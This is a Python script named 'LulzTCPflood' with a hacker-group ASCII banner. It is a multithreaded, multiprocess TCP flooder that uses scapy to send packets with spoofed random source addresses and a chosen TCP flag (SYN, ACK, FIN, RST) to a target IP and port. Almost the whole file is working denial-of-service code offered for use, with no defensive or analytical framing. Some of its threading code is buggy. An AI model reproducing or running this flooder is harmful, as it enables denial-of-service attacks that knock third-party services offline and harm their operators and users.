#!/usr/bin/env python
############################################
# LulzTCPflood		                   #
# A multithreaded multiprocess TCP Flooder #
# By:The LulzBoat  			   #
#                                          #
############################################
import socket, random, sys, threading, multiprocessing
from scapy.all import *


if len(sys.argv) != 6:
	print "Usage: %s <Target IP> <Port> <TCP Flag> <Number of Threads> <Number of Processes>" % sys.argv[0]
	sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])
flag = sys.argv[3] #Valid TCP Flags are S for SYN, A for ACK, F for FIN, R for RST, use CAPS for flag
rthread = int(sys.argv[4]) #You Don't Seem to Need a Ton of Threads Since This is Multi-processed
multi = int(sys.argv[5]) #Number of Processes Should not exceed The Number of Cores in Your Computer

conf.iface='wlan0';#This is Your Network Card Change as is Appropriate
total = 0

def goodbye():
    sys.exit("\n" + "*" *43 + "\n\nBye! Come use me again!\n\n" + "*" *43 + "")
	

print"""
                _.--| LuLz|:                    
               <____|.----||                    
                      .---''---,                
   The                 ;..__..'    _...         
    Lulz            , '/  ||/..--''    \        
     Boat         ,'_ /'.-||            :       
      2017   _..-' ''/    ||  \    \   _|/|     
           \        /-._;/||   \    \,;'   \    
           ,\      /    /`||    \   //    `:`.  
         ,'  \    /-._;/  ||    : ::    ,.   . 
       ,'     \  /    /`-.||    | || ' :  `.`.)
    _,'        |;._: /|  ;||    | `|   :    `' 
  ,'   `.      /    /`-:_/||    |  |  : \      
  `--.   )    /'-._/    /:||       |   \ \     
     /  /    /'_  /;`-./_;||__..--';    : :    
    /  (    /  -./_  _/  .||'o |   /     ' |    
   /  , \._/_/_./--''/_  /||___|_,'      | |    
  :  /   `'-'--'----'---------'          / |    
  | :     O ._O   O_. O ._O   O_.       ; ;    
  : `.      //    //    //    //       /     
~~~`.______//____//____//____//_______ ,'~~     
          //    //~   //    // ~ ~ ~ ~~~~    
   ~~   _//   _//   _// ~ _//    ~  ~ ~ ~    
 ~     / /   / /   / /   / /  ~      ~~       
      ~~~   ~~~   ~~~   ~~~                   
                                   Setting Sail to the horizon. 
                                          Yours Truly.
                                        LulzSecurity2017
                                          Lulz Zombie   """

					
class sendTCP(threading.Thread):

    def __init__(self):
	    threading.Thread.__init__(self)
    
    def threading(self):
            threading.thread = rthread
            threading.thread(target=run)
            rthread.start()

    def run(self):
            global total
            while True:
               total = total + 1
               ip = IP()
	       ip.src = "%i.%i.%i.%i" % (random.randint(11,126),random.randint(1,254),random.randint(1,254),random.randint(1,254))
	       ip.dst = target
	       t = TCP()
	       t.sport = random.randint(1,65535)
	       t.dport = port
	       t.flags = flag
               send(ip/t, verbose=0)
               sys.stdout.write("\r Packets Sended:\t\t\t%i" % total)
               break

print "Flooding %s:%i with TCP %s packets." % (target, port, flag)

if __name__ == "__main__":
	while True:
                  try:
                     sendTCP().start()
                     multi = multiprocessing.Process(target=sendTCP)
                     multi.start()

                  except KeyboardInterrupt:
                      goodbye()

